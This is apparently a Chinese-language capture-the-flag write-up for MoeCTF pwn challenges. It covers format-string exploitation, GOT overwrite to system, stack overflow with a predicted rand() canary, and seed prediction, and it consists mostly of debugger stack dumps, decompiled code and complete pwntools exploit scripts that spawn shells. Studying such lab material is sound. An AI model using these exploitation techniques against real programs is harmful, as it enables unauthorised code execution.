(__do_global_dtors_aux_fini_array_entry) —▸ 0x4011c0 (__do_global_dtors_aux) ◂— endbr6411:0088│+078 0x7ffea65006f8 —▸ 0x7913edace040 (_rtld_global) —▸ 0x7913edacf2e0 ◂— 012:0090│+080 0x7ffea6500700 ◂— 0x92dbb32a1476566c13:0098│+088 0x7ffea6500708 ◂— 0x9f01248f239e566c14:00a0│+090 0x7ffea6500710 ◂— 0x79130000000015:00a8│+098 0x7ffea6500718 ◂— 0... ↓        3 skipped19:00c8│+0b8 0x7ffea6500738 ◂— 0xb0add8007ab876001a:00d0│+0c0 0x7ffea6500740 ◂— 01b:00d8│+0c8 0x7ffea6500748 —▸ 0x7913ed829e40 (__libc_start_main+128) ◂— mov r15, qword ptr [rip + 0x1f0159]1c:00e0│+0d0 0x7ffea6500750 —▸ 0x7ffea65007c8 —▸ 0x7ffea6502a14 ◂— &#x27;SHELL=/bin/bash&#x27;1d:00e8│+0d8 0x7ffea6500758 —▸ 0x403e00 (__do_global_dtors_aux_fini_array_entry) —▸ 0x4011c0 (__do_global_dtors_aux) ◂— endbr641e:00f0│+0e0 0x7ffea6500760 —▸ 0x7913edacf2e0 ◂— 01f:00f8│+0e8 0x7ffea6500768 ◂— 020:0100│+0f0 0x7ffea6500770 ◂— 021:0108│+0f8 0x7ffea6500778 —▸ 0x401110 (_start) ◂— endbr6422:0110│+100 0x7ffea6500780 —▸ 0x7ffea65007b0 ◂— 123:0118│+108 0x7ffea6500788 ◂— 024:0120│+110 0x7ffea6500790 ◂— 025:0128│+118 0x7ffea6500798 —▸ 0x401135 (_start+37) ◂— hlt26:0130│+120 0x7ffea65007a0 —▸ 0x7ffea65007a8 ◂— 0x1c27:0138│+128 0x7ffea65007a8 ◂— 0x1c28:0140│+130 0x7ffea65007b0 ◂— 129:0148│ r12 0x7ffea65007b8 —▸ 0x7ffea650069f ◂— 0x1002a:0150│+140 0x7ffea65007c0 ◂— 02b:0158│+148 0x7ffea65007c8 —▸ 0x7ffea6502a14 ◂— &#x27;SHELL=/bin/bash&#x27;2c:0160│+150 0x7ffea65007d0 —▸ 0x7ffea6502a24 ◂— &#x27;COLORTERM=truecolor&#x27;
关键的变化是
0b:0058│+048 0x7ffea65006c8 —▸ 0x7ffea65007b8 —▸ 0x7ffea65029ee ◂— &#x27;/home/ubuntu/Moectf/fmt_s/pwn_patched&#x27;
0b:0058│+048 0x7ffea65006c8 —▸ 0x7ffea65007b8 —▸ 0x7ffea650069f ◂— 0x100
此时0x7ffea650069f指向的恰好是i的最高位地址05:0028│+018 0x7ffea6500698 ◂— 0x200401110
第三次printf前
00:0000│ rsp 0x7ffea6500670 —▸ 0x7ffea65007b8 —▸ 0x7ffea650069f ◂— 0x10001:0008│-008 0x7ffea6500678 ◂— 0x80040136f02:0010│ rbp 0x7ffea6500680 —▸ 0x7ffea65006a0 ◂— 103:0018│+008 0x7ffea6500688 —▸ 0x4013b1 (main+66) ◂— add dword ptr [rbp - 4], 104:0020│+010 0x7ffea6500690 ◂— 0x100005:0028│+018 0x7ffea6500698 ◂— 0x30040111006:0030│+020 0x7ffea65006a0 ◂— 107:0038│+028 0x7ffea65006a8 —▸ 0x7913ed829d90 ◂— mov edi, eax08:0040│+030 0x7ffea65006b0 ◂— 009:0048│+038 0x7ffea65006b8 —▸ 0x40136f (main) ◂— endbr640a:0050│+040 0x7ffea65006c0 ◂— 0x1a65007a00b:0058│+048 0x7ffea65006c8 —▸ 0x7ffea65007b8 —▸ 0x7ffea650069f ◂— 0x1000c:0060│+050 0x7ffea65006d0 ◂— 00d:0068│+058 0x7ffea65006d8 ◂— 0x6d26ff8a1914566c0e:0070│+060 0x7ffea65006e0 —▸ 0x7ffea65007b8 —▸ 0x7ffea650069f ◂— 0x1000f:0078│+068 0x7ffea65006e8 —▸ 0x40136f (main) ◂— endbr6410:0080│+070 0x7ffea65006f0 —▸ 0x403e00 (__do_global_dtors_aux_fini_array_entry) —▸ 0x4011c0 (__do_global_dtors_aux) ◂— endbr6411:0088│+078 0x7ffea65006f8 —▸ 0x7913edace040 (_rtld_global) —▸ 0x7913edacf2e0 ◂— 012:0090│+080 0x7ffea6500700 ◂— 0x92dbb32a1476566c13:0098│+088 0x7ffea6500708 ◂— 0x9f01248f239e566c14:00a0│+090 0x7ffea6500710 ◂— 0x79130000000015:00a8│+098 0x7ffea6500718 ◂— 0... ↓        3 skipped19:00c8│+0b8 0x7ffea6500738 ◂— 0xb0add8007ab876001a:00d0│+0c0 0x7ffea6500740 ◂— 01b:00d8│+0c8 0x7ffea6500748 —▸ 0x7913ed829e40 (__libc_start_main+128) ◂— mov r15, qword ptr [rip + 0x1f0159]1c:00e0│+0d0 0x7ffea6500750 —▸ 0x7ffea65007c8 —▸ 0x7ffea6502a14 ◂— &#x27;SHELL=/bin/bash&#x27;1d:00e8│+0d8 0x7ffea6500758 —▸ 0x403e00 (__do_global_dtors_aux_fini_array_entry) —▸ 0x4011c0 (__do_global_dtors_aux) ◂— endbr641e:00f0│+0e0 0x7ffea6500760 —▸ 0x7913edacf2e0 ◂— 01f:00f8│+0e8 0x7ffea6500768 ◂— 020:0100│+0f0 0x7ffea6500770 ◂— 021:0108│+0f8 0x7ffea6500778 —▸ 0x401110 (_start) ◂— endbr6422:0110│+100 0x7ffea6500780 —▸ 0x7ffea65007b0 ◂— 123:0118│+108 0x7ffea6500788 ◂— 024:0120│+110 0x7ffea6500790 ◂— 025:0128│+118 0x7ffea6500798 —▸ 0x401135 (_start+37) ◂— hlt26:0130│+120 0x7ffea65007a0 —▸ 0x7ffea65007a8 ◂— 0x1c27:0138│+128 0x7ffea65007a8 ◂— 0x1c28:0140│+130 0x7ffea65007b0 ◂— 129:0148│ r12 0x7ffea65007b8 —▸ 0x7ffea650069f ◂— 0x1002a:0150│+140 0x7ffea65007c0 ◂— 02b:0158│+148 0x7ffea65007c8 —▸ 0x7ffea6502a14 ◂— &#x27;SHELL=/bin/bash&#x27;2c:0160│+150 0x7ffea65007d0 —▸ 0x7ffea6502a24 ◂— &#x27;COLORTERM=truecolor&#x27;
printf后
00:0000│ rsp 0x7ffea6500670 —▸ 0x7ffea65007b8 —▸ 0x7ffea650069f ◂— 0x1ff01:0008│-008 0x7ffea6500678 ◂— 0x80040136f02:0010│ rbp 0x7ffea6500680 —▸ 0x7ffea65006a0 ◂— 103:0018│+008 0x7ffea6500688 —▸ 0x4013b1 (main+66) ◂— add dword ptr [rbp - 4], 104:0020│+010 0x7ffea6500690 ◂— 0x100005:0028│+018 0x7ffea6500698 ◂— 0xff0000030040111006:0030│+020 0x7ffea65006a0 ◂— 107:0038│+028 0x7ffea65006a8 —▸ 0x7913ed829d90 ◂— mov edi, eax08:0040│+030 0x7ffea65006b0 ◂— 009:0048│+038 0x7ffea65006b8 —▸ 0x40136f (main) ◂— endbr640a:0050│+040 0x7ffea65006c0 ◂— 0x1a65007a00b:0058│+048 0x7ffea65006c8 —▸ 0x7ffea65007b8 —▸ 0x7ffea650069f ◂— 0x1ff0c:0060│+050 0x7ffea65006d0 ◂— 00d:0068│+058 0x7ffea65006d8 ◂— 0x6d26ff8a1914566c0e:0070│+060 0x7ffea65006e0 —▸ 0x7ffea65007b8 —▸ 0x7ffea650069f ◂— 0x1ff0f:0078│+068 0x7ffea65006e8 —▸ 0x40136f (main) ◂— endbr6410:0080│+070 0x7ffea65006f0 —▸ 0x403e00 (__do_global_dtors_aux_fini_array_entry) —▸ 0x4011c0 (__do_global_dtors_aux) ◂— endbr6411:0088│+078 0x7ffea65006f8 —▸ 0x7913edace040 (_rtld_global) —▸ 0x7913edacf2e0 ◂— 012:0090│+080 0x7ffea6500700 ◂— 0x92dbb32a1476566c13:0098│+088 0x7ffea6500708 ◂— 0x9f01248f239e566c14:00a0│+090 0x7ffea6500710 ◂— 0x79130000000015:00a8│+098 0x7ffea6500718 ◂— 0... ↓        3 skipped19:00c8│+0b8 0x7ffea6500738 ◂— 0xb0add8007ab876001a:00d0│+0c0 0x7ffea6500740 ◂— 01b:00d8│+0c8 0x7ffea6500748 —▸ 0x7913ed829e40 (__libc_start_main+128) ◂— mov r15, qword ptr [rip + 0x1f0159]1c:00e0│+0d0 0x7ffea6500750 —▸ 0x7ffea65007c8 —▸ 0x7ffea6502a14 ◂— &#x27;SHELL=/bin/bash&#x27;1d:00e8│+0d8 0x7ffea6500758 —▸ 0x403e00 (__do_global_dtors_aux_fini_array_entry) —▸ 0x4011c0 (__do_global_dtors_aux) ◂— endbr641e:00f0│+0e0 0x7ffea6500760 —▸ 0x7913edacf2e0 ◂— 01f:00f8│+0e8 0x7ffea6500768 ◂— 020:0100│+0f0 0x7ffea6500770 ◂— 021:0108│+0f8 0x7ffea6500778 —▸ 0x401110 (_start) ◂— endbr6422:0110│+100 0x7ffea6500780 —▸ 0x7ffea65007b0 ◂— 123:0118│+108 0x7ffea6500788 ◂— 024:0120│+110 0x7ffea6500790 ◂— 025:0128│+118 0x7ffea6500798 —▸ 0x401135 (_start+37) ◂— hlt26:0130│+120 0x7ffea65007a0 —▸ 0x7ffea65007a8 ◂— 0x1c27:0138│+128 0x7ffea65007a8 ◂— 0x1c28:0140│+130 0x7ffea65007b0 ◂— 129:0148│ r12 0x7ffea65007b8 —▸ 0x7ffea650069f ◂— 0x1ff2a:0150│+140 0x7ffea65007c0 ◂— 02b:0158│+148 0x7ffea65007c8 —▸ 0x7ffea6502a14 ◂— &#x27;SHELL=/bin/bash&#x27;2c:0160│+150 0x7ffea65007d0 —▸ 0x7ffea6502a24 ◂— &#x27;COLORTERM=truecolor&#x27;
我们利用的是0b:0058│+048 0x7ffea65006c8 —▸ 0x7ffea65007b8 —▸ 0x7ffea650069f ◂— 0x100
找到第二个指针29:0148│ r12 0x7ffea65007b8 —▸ 0x7ffea650069f ◂— 0x100
偏移量是47，我们就可以利用这个来修改我们i的最高位了
关键的变化是
05:0028│+018 0x7ffea6500698 ◂— 0x300401110
05:0028│+018 0x7ffea6500698 ◂— 0xff00000300401110
可以看到我们已经实现了无限写
下面的修改也是一模一样，就不再赘述了
p = start()p.recvuntil(b&quot;You start talking to him...\n&quot;)payload1=b&#x27;A&#x27;*8+b&quot;%33$p&quot;+b&quot;%13$p&quot;+b&quot;%8$p&quot;p.send(payload1)data = p.recv(50)addrs = data[8:].decode()addr1_str = addrs[2:14]addr2_str = addrs[16:28]addr3_str = addrs[30:42]libc_main_addr = int(addr1_str, 16)return_addr = int(addr2_str, 16)rbp_addr = int(addr3_str, 16)-0x20log.success(f&quot;libc_main_addr: &#123;hex(libc_main_addr)&#125;&quot;)log.success(f&quot;return_addr: &#123;hex(return_addr)&#125;&quot;)log.success(f&quot;rbp_addr: &#123;hex(rbp_addr)&#125;&quot;)libc_base=libc_main_addr-128-libc.sym[&quot;__libc_start_main&quot;]log.success(f&quot;libc_base_addr: &#123;hex(libc_base)&#125;&quot;)one_gadget_addr=libc_base+0xebc81log.success(f&quot;one_gadget_addr: &#123;hex(one_gadget_addr)&#125;&quot;)p.recvuntil(b&quot;You enraged the monster-prepare for battle!\n&quot;)p.send(b&quot;fffffff0&quot;)one_gadget_1 = one_gadget_addr &amp; 0xffff # 后两位one_gadget_2 = (one_gadget_addr &gt;&gt; 16)&amp; 0xffff # 往前推俩one_gadget_3 = (one_gadget_addr &gt;&gt; 32)&amp; 0xffff # 再往前推两位main_ret_addr=(rbp_addr+0x28)&amp; 0xffffmain_ret_addr_2=(rbp_addr+0x28+2)&amp; 0xffffmain_ret_addr_3=(rbp_addr+0x28+4)&amp; 0xffffmain_rbp_addr=(rbp_addr+0x20)&amp; 0xffffmain_rbp_addr_2=(rbp_addr+0x20+2)&amp; 0xffffmain_rbp_addr_3=(rbp_addr+0x20+4)&amp; 0xfffftalk_ret_addr=(rbp_addr+0x8)&amp;0xffffr_addr=rbp_addr+0x110r_addr_1=r_addr &amp; 0xffffr_addr_2=(r_addr &gt;&gt; 16)&amp; 0xffffr_addr_3=(r_addr &gt;&gt; 32)&amp; 0xffffi_addr=(rbp_addr+0x18+7)&amp; 0xffff#修改i值达到无限写p.recvuntil(b&quot;You start talking to him...\n&quot;)payload2=b&quot;%&quot; + str(i_addr).encode(&quot;utf-8&quot;) + b&quot;c%17$hn\x00&quot;p.send(payload2)p.recvuntil(b&quot;You enraged the monster-prepare for battle!\n&quot;)p.send(b&quot;fffffff0&quot;)p.recvuntil(b&quot;You start talking to him...\n&quot;)payload3=b&quot;%&quot; + str(0xff).encode(&quot;utf-8&quot;) + b&quot;c%47$hhn&quot;p.send(payload3)p.recvuntil(b&quot;You enraged the monster-prepare for battle!\n&quot;)p.send(b&quot;fffffff0&quot;)#修改返回地址p.recvuntil(b&quot;You start talking to him...\n&quot;)payload4=b&quot;%&quot; + str(main_ret_addr).encode(&quot;utf-8&quot;) + b&quot;c%20$hn\x00&quot;p.send(payload4)p.recvuntil(b&quot;You enraged the monster-prepare for battle!\n&quot;)p.send(b&quot;fffffff0&quot;)p.recvuntil(b&quot;You start talking to him...\n&quot;)payload5=b&quot;%&quot; + str(one_gadget_1).encode(&quot;utf-8&quot;) + b&quot;c%47$hn&quot;p.send(payload5)p.recvuntil(b&quot;You enraged the monster-prepare for battle!\n&quot;)p.send(b&quot;fffffff0&quot;)p.recvuntil(b&quot;You start talking to him...\n&quot;)payload6=b&quot;%&quot; + str(main_ret_addr_2).encode(&quot;utf-8&quot;) + b&quot;c%20$hn\x00&quot;p.send(payload6)p.recvuntil(b&quot;You enraged the monster-prepare for battle!\n&quot;)p.send(b&quot;fffffff0&quot;)p.recvuntil(b&quot;You start talking to him...\n&quot;)payload7=b&quot;%&quot; + str(one_gadget_2).encode(&quot;utf-8&quot;) + b&quot;c%47$hn&quot;p.send(payload7)p.recvuntil(b&quot;You enraged the monster-prepare for battle!\n&quot;)p.send(b&quot;fffffff0&quot;)p.recvuntil(b&quot;You start talking to him...\n&quot;)payload8=b&quot;%&quot; + str(main_ret_addr_3).encode(&quot;utf-8&quot;) + b&quot;c%20$hn\x00&quot;p.send(payload8)p.recvuntil(b&quot;You enraged the monster-prepare for battle!\n&quot;)p.send(b&quot;fffffff0&quot;)p.recvuntil(b&quot;You start talking to him...\n&quot;)payload9=b&quot;%&quot; + str(one_gadget_3).encode(&quot;utf-8&quot;) + b&quot;c%47$hn&quot;p.send(payload9)p.recvuntil(b&quot;You enraged the monster-prepare for battle!\n&quot;)p.send(b&quot;fffffff0&quot;)p.recvuntil(b&quot;You start talking to him...\n&quot;)payload10=b&quot;%&quot; + str(main_rbp_addr).encode(&quot;utf-8&quot;) + b&quot;c%20$hn\x00&quot;p.send(payload10)p.recvuntil(b&quot;You enraged the monster-prepare for battle!\n&quot;)p.send(b&quot;fffffff0&quot;)p.recvuntil(b&quot;You start talking to him...\n&quot;)payload11=b&quot;%&quot; + str(r_addr_1).encode(&quot;utf-8&quot;) + b&quot;c%47$hn&quot;p.send(payload11)p.recvuntil(b&quot;You enraged the monster-prepare for battle!\n&quot;)p.send(b&quot;fffffff0&quot;)p.recvuntil(b&quot;You start talking to him...\n&quot;)payload12=b&quot;%&quot; + str(main_rbp_addr_2).encode(&quot;utf-8&quot;) + b&quot;c%20$hn\x00&quot;p.send(payload12)p.recvuntil(b&quot;You enraged the monster-prepare for battle!\n&quot;)p.send(b&quot;fffffff0&quot;)p.recvuntil(b&quot;You start talking to him...\n&quot;)payload13=b&quot;%&quot; + str(r_addr_2).encode(&quot;utf-8&quot;) + b&quot;c%47$hn&quot;p.send(payload13)p.recvuntil(b&quot;You enraged the monster-prepare for battle!\n&quot;)p.send(b&quot;fffffff0&quot;)p.recvuntil(b&quot;You start talking to him...\n&quot;)payload14=b&quot;%&quot; + str(main_rbp_addr_3).encode(&quot;utf-8&quot;) + b&quot;c%20$hn\x00&quot;p.send(payload14)p.recvuntil(b&quot;You enraged the monster-prepare for battle!\n&quot;)p.send(b&quot;fffffff0&quot;)p.recvuntil(b&quot;You start talking to him...\n&quot;)payload15=b&quot;%&quot; + str(r_addr_3).encode(&quot;utf-8&quot;) + b&quot;c%47$hn&quot;p.send(payload15)p.recvuntil(b&quot;You enraged the monster-prepare for battle!\n&quot;)p.send(b&quot;fffffff0&quot;)p.recvuntil(b&quot;You start talking to him...\n&quot;)payload16=b&quot;%&quot; + str(talk_ret_addr).encode(&quot;utf-8&quot;) + b&quot;c%20$hn\x00&quot;p.send(payload16)p.recvuntil(b&quot;You enraged the monster-prepare for battle!\n&quot;)p.send(b&quot;fffffff0&quot;)p.recvuntil(b&quot;You start talking to him...\n&quot;)payload17=b&quot;%&quot; + str(0xed).encode(&quot;utf-8&quot;) + b&quot;c%47$hhn&quot;p.send(payload17)p.recvuntil(b&quot;You enraged the monster-prepare for battle!\n&quot;)p.send(b&quot;1&quot;)p.interactive()
fmt_t
int __fastcall main(int argc, const char **argv, const char **envp)&#123;  char s[24]; // [rsp+0h] [rbp-20h] BYREF  unsigned __int64 v5; // [rsp+18h] [rbp-8h]  v5 = __readfsqword(0x28u);  init(argc, argv, envp);  fgets(s, 6, stdin);  printf(s);  puts(&quot;Anyone who uses format strings should be punished!\nGo to hell!&quot;);  hell(5LL);  return 0;&#125;
unsigned __int64 __fastcall hell(int n)&#123;  char s[88]; // [rsp+10h] [rbp-60h] BYREF  unsigned __int64 v3; // [rsp+68h] [rbp-8h]  v3 = __readfsqword(0x28u);  printf(&quot;You&#x27;ve reached the level %d of hell.\n&quot;, n);  if ( n &lt;= 30 )  &#123;    fgets(s, n, stdin);    hell((unsigned int)(n + 11));    if ( (unsigned int)pd(s, n) )      printf(s);  &#125;  else  &#123;    puts(&quot;You&#x27;ve been swallowed by hell.&quot;);  &#125;  return v3 - __readfsqword(0x28u);&#125;
__int64 __fastcall pd(__int64 a1, unsigned __int64 i_1)&#123;  unsigned __int64 i; // [rsp+18h] [rbp-8h]  for ( i = 0LL; i &lt; i_1; ++i )  &#123;    if ( *(_BYTE *)(a1 + i) == 37 )      return 1LL;  &#125;  return 0LL;&#125;
我们可以从第一个格式化字符串漏洞得到libc基址，发现一个嵌套函数，还有一个pd函数判断是否含”%“
第一次只能输入4个有效字符，有什么用呢？
[*] &#x27;/home/ubuntu/Moectf/fmt_t/pwn&#x27;    Arch:       amd64-64-little    RELRO:      Partial RELRO    Stack:      Canary found    NX:         NX enabled    PIE:        No PIE (0x400000)    SHSTK:      Enabled    IBT:        Enabled    Stripped:   No
got表可写，假如我在第一次输入时写入sh，将printf改为system，就可以实现劫持，要调用printf要一个%，所以可以写入sh;%
参照fmt_s，我们应该先写入地址，再进行修改，这道题利用格式化字符串漏洞的机会最多3次，因此考虑利用一次将所以内容修改
因此我们在第二次输入时将printf的got表地址在栈上布置好
00:0000│ rsp 0x7ffe6d8e2760 ◂— 0x16d8e299801:0008│-068 0x7ffe6d8e2768 ◂— 0x100000000002:0010│ rax 0x7ffe6d8e2770 —▸ 0x40401a (printf@got[plt]+2) ◂— 0xf38000007ea4150603:0018│-058 0x7ffe6d8e2778 —▸ 0x404018 (printf@got[plt]) —▸ 0x7ea4150606f0 (printf) ◂— endbr6404:0020│-050 0x7ffe6d8e2780 —▸ 0x7ea41521aaa0 (_IO_2_1_stdin_) ◂— 0xfbad208b05:0028│-048 0x7ffe6d8e2788 —▸ 0x7ffe6d8e27f0 ◂— 0x7e00253b6873 /* &#x27;sh;%&#x27; */06:0030│-040 0x7ffe6d8e2790 ◂— 0
在第三次利用布置好的地址进行修改
00:0000│ rsp 0x7ffe6d8e26e0 ◂— 0x16d8e299801:0008│-068 0x7ffe6d8e26e8 ◂— 0x1b0000000002:0010│ rax 0x7ffe6d8e26f0 ◂— &#x27;%3440c%25$hn%1941c%24$hn&#x27;03:0018│-058 0x7ffe6d8e26f8 ◂— &#x27;5$hn%1941c%24$hn&#x27;04:0020│-050 0x7ffe6d8e2700 ◂— &#x27;1c%24$hn&#x27;05:0028│-048 0x7ffe6d8e2708 ◂— 0x7ffe6d00000006:0030│-040 0x7ffe6d8e2710 ◂— 007:0038│-038 0x7ffe6d8e2718 —▸ 0x403e00 (__do_global_dtors_aux_fini_array_entry) —▸ 0x401180 (__do_global_dtors_aux) ◂— endbr6408:0040│-030 0x7ffe6d8e2720 —▸ 0x7ea415360040 (_rtld_global) —▸ 0x7ea4153612e0 ◂— 009:0048│-028 0x7ffe6d8e2728 —▸ 0x7ea41507f410 (fgets+144) ◂— mov edx, dword ptr [rbp]0a:0050│-020 0x7ffe6d8e2730 ◂— 00b:0058│-018 0x7ffe6d8e2738 —▸ 0x7ffe6d8e27d0 —▸ 0x7ffe6d8e2850 —▸ 0x7ffe6d8e2880 ◂— 10c:0060│-010 0x7ffe6d8e2740 —▸ 0x7ffe6d8e2998 —▸ 0x7ffe6d8e39ee ◂— &#x27;/home/ubuntu/Moectf/fmt_t/pwn_patched&#x27;0d:0068│-008 0x7ffe6d8e2748 ◂— 0x37d295624a871a000e:0070│ rbp 0x7ffe6d8e2750 —▸ 0x7ffe6d8e27d0 —▸ 0x7ffe6d8e2850 —▸ 0x7ffe6d8e2880 ◂— 10f:0078│+008 0x7ffe6d8e2758 —▸ 0x4012b9 (hell+115) ◂— mov eax, dword ptr [rbp - 0x64]10:0080│+010 0x7ffe6d8e2760 ◂— 0x16d8e299811:0088│+018 0x7ffe6d8e2768 ◂— 0x100000000012:0090│+020 0x7ffe6d8e2770 —▸ 0x40401a (printf@got[plt]+2) ◂— 0xf38000007ea4150613:0098│+028 0x7ffe6d8e2778 —▸ 0x404018 (printf@got[plt]) —▸ 0x7ea4150606f0 (printf) ◂— endbr6414:00a0│+030 0x7ffe6d8e2780 —▸ 0x7ea41521aaa0 (_IO_2_1_stdin_) ◂— 0xfbad208b15:00a8│+038 0x7ffe6d8e2788 —▸ 0x7ffe6d8e27f0 ◂— 0x7e00253b6873 /* &#x27;sh;%&#x27; */16:00b0│+040 0x7ffe6d8e2790 ◂— 0
GOT protection: Partial RELRO | Found 5 GOT entries passing the filter[0x404000] puts@GLIBC_2.2.5 -&gt; 0x7ea415080e50 (puts) ◂— endbr64[0x404008] __stack_chk_fail@GLIBC_2.4 -&gt; 0x401040 ◂— endbr64[0x404010] setbuf@GLIBC_2.2.5 -&gt; 0x7ea415087fe0 (setbuf) ◂— endbr64[0x404018] printf@GLIBC_2.2.5 -&gt; 0x7ea4150606f0 (printf) ◂— endbr64[0x404020] fgets@GLIBC_2.2.5 -&gt; 0x7ea41507f380 (fgets) ◂— endbr64
修改后
GOT protection: Partial RELRO | Found 5 GOT entries passing the filter[0x404000] puts@GLIBC_2.2.5 -&gt; 0x7ea415080e50 (puts) ◂— endbr64[0x404008] __stack_chk_fail@GLIBC_2.4 -&gt; 0x401040 ◂— endbr64[0x404010] setbuf@GLIBC_2.2.5 -&gt; 0x7ea415087fe0 (setbuf) ◂— endbr64[0x404018] printf@GLIBC_2.2.5 -&gt; 0x7ea415050d70 (system) ◂— endbr64[0x404020] fgets@GLIBC_2.2.5 -&gt; 0x7ea41507f380 (fgets) ◂— endbr64
p = start()p.send(b&quot;%31$p&quot;)p.recvuntil(b&quot;0x&quot;)data=p.recv(12)libc_main_addr=int(data,16)libc_base_addr=libc_main_addr-libc.sym[&quot;__libc_start_main&quot;]-128system_addr=libc_base_addr+libc.sym[&quot;system&quot;]log.success(f&quot;system_addr: &#123;hex(system_addr)&#125;&quot;)log.success(f&quot;libc_base_addr: &#123;hex(libc_base_addr)&#125;&quot;)system_1 = system_addr &amp; 0xffff system_2 = (system_addr &gt;&gt; 16)&amp; 0xffff system_3=(system_2-system_1)&amp; 0xffffgot_addr=elf.got[&#x27;printf&#x27;]got_1 = got_addr &amp; 0xffff got_2 = (got_addr &gt;&gt; 16)&amp; 0xffffp.recvuntil(b&quot;of hell.\n&quot;)payload1=b&quot;sh;%&quot;p.send(payload1)p.recvuntil(b&quot;of hell.\n&quot;)payload2=p64(got_addr+2)+p32(got_addr)p.send(payload2.ljust(15,b&quot;\x00&quot;))p.recvuntil(b&quot;of hell.\n&quot;)payload4=b&quot;%&quot; + str(system_1).encode(&quot;utf-8&quot;) + b&quot;c%25$hn&quot;+b&quot;%&quot; + str(system_3).encode(&quot;utf-8&quot;) + b&quot;c%24$hn&quot;p.send(payload4.ljust(27,b&#x27;\x00&#x27;))p.interactive()
boom &amp; boom_revenge
int __fastcall main(int argc, const char **argv, const char **envp)&#123;  char s[124]; // [rsp+0h] [rbp-90h] BYREF  int canary; // [rsp+7Ch] [rbp-14h]  int v6; // [rsp+8Ch] [rbp-4h]  init(argc, argv, envp);  puts(&quot;Welcome to Secret Message Book!&quot;);  puts(&quot;Do you want to brute-force this system? (y/n)&quot;);  fgets(&amp;brute_choice, 8, stdin);  v6 = 0;  if ( brute_choice == 121 || brute_choice == 89 )  &#123;    v6 = 1;    canary = (int)random() % 114514;    canary = canary;    puts(&quot;waiting...&quot;);    sleep(1u);    puts(&quot;boom!&quot;);    puts(&quot;Brute-force mode enabled! Security on.&quot;);  &#125;  else  &#123;    puts(&quot;Normal mode. No overflow allowed.&quot;);  &#125;  printf(&quot;Enter your message: &quot;);  if ( v6 )    gets(s);  else    fgets(s, 128, stdin);  if ( v6 &amp;&amp; canary != canary )  &#123;    puts(&quot;Security check failed!&quot;);    exit(1);  &#125;  puts(&quot;Message received.&quot;);  return 0;&#125;
.text:0000000000401276 win             proc near.text:0000000000401276 ; __unwind &#123;.text:0000000000401276                 endbr64.text:000000000040127A                 push    rbp.text:000000000040127B                 mov     rbp, rsp.text:000000000040127E                 lea     rax, command    ; &quot;/bin/sh&quot;.text:0000000000401285                 mov     rdi, rax        ; command.text:0000000000401288                 call    _system.text:000000000040128D                 nop.text:000000000040128E                 pop     rbp.text:000000000040128F                 retn.text:000000000040128F ; &#125; // starts at 401276.text:000000000040128F win             endp
下面是boom_revenge的
int __fastcall main(int argc, const char **argv, const char **envp)&#123;  char s[124]; // [rsp+0h] [rbp-90h] BYREF  int canary; // [rsp+7Ch] [rbp-14h]  int v6; // [rsp+8Ch] [rbp-4h]  init(argc, argv, envp);  puts(&quot;Welcome to Secret Message Book!&quot;);  puts(&quot;Do you want to brute-force this system? (y/n)&quot;);  fgets(&amp;brute_choice, 8, stdin);  v6 = 0;  if ( brute_choice == 121 || brute_choice == 89 )  &#123;    v6 = 1;    canary = (int)random() % 114514;    canary = canary;    puts(&quot;waiting...&quot;);    sleep(1u);    puts(&quot;boom!&quot;);    puts(&quot;Brute-force mode enabled! Security on.&quot;);  &#125;  else  &#123;    puts(&quot;Normal mode. No overflow allowed.&quot;);  &#125;  printf(&quot;Enter your message: &quot;);  if ( v6 )  &#123;    gets(s);    if ( canary != canary )    &#123;      puts(&quot;Security check failed!&quot;);      exit(1);    &#125;  &#125;  else  &#123;    fgets(s, 128, stdin);  &#125;  puts(&quot;Message received.&quot;);  return 0;&#125;
后门函数也存在
区别就在
#boom  if ( v6 )    gets(s);  else    fgets(s, 128, stdin);  if ( v6 &amp;&amp; canary != canary )&#123;    puts(&quot;Security check failed!&quot;);    exit(1);  &#125;  puts(&quot;Message received.&quot;);
#boom_revenge	if ( v6 )&#123;    	gets(s);    	if ( canary != canary )&#123;      		puts(&quot;Security check failed!&quot;);      		exit(1);    	&#125;  	&#125;  	else&#123;    	fgets(s, 128, stdin);  	&#125;  	puts(&quot;Message received.&quot;);
要实现溢出，就要使用gets(s)，就要v6=1
在boom中我们直接可以将v6覆盖为零，并且覆盖返回地址，这样就不会触发exit
在boom_revenge中我们无法利用boom的方法，就直接利用随机数生成canary通过检验并且覆盖返回地址就行了
只展示boom_revenge的方法，boom使用这个也可以过
p = start()p.recvuntil(b&quot;Do you want to brute-force this system? (y/n)\n&quot;)p.send(b&quot;y\n&quot;);elf1=ctypes.CDLL(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)elf1.srand(elf1.time(0))canary = elf1.rand()%114514print(f&quot;生成的 canary 值: &#123;hex(canary)&#125;,&#123;canary&#125;&quot;)p.recvuntil(b&quot;Enter your message: &quot;)payload=b&#x27;A&#x27;*0x7C+p32(canary)+b&#x27;0&#x27;*12+p32(1)+p64(0x40127E)*2p.sendline(payload)p.interactive()
randomlock
int __fastcall main(int argc, const char **argv, const char **envp)&#123;  int v4; // [rsp+Ch] [rbp-14h] BYREF  int i; // [rsp+10h] [rbp-10h]  int v6; // [rsp+14h] [rbp-Ch]  unsigned __int64 v7; // [rsp+18h] [rbp-8h]  v7 = __readfsqword(0x28u);  init(argc, argv, envp);  initseed();  srand(seed);  puts(&quot;My lock looks strange—can you help me?&quot;);  for ( i = 1; i &lt;= 10; ++i )  &#123;    printf(&quot;password %d\n&gt;&quot;, i);    v6 = rand() % 10000;    __isoc99_scanf(&quot;%d&quot;, &amp;v4);    if ( v6 != v4 )      lose();  &#125;  win();  return 0;&#125;
unsigned __int64 win()&#123;  FILE *stream; // [rsp+8h] [rbp-118h]  char s[264]; // [rsp+10h] [rbp-110h] BYREF  unsigned __int64 v3; // [rsp+118h] [rbp-8h]  v3 = __readfsqword(0x28u);  puts(&quot;It opened—how did you do that?&quot;);  stream = fopen(&quot;./flag&quot;, &quot;r&quot;);  fgets(s, 100, stream);  puts(s);  return v3 - __readfsqword(0x28u);&#125;
void __noreturn lose()&#123;  puts(&quot;Incorrect password.&quot;);  exit(0);&#125;
模仿即可
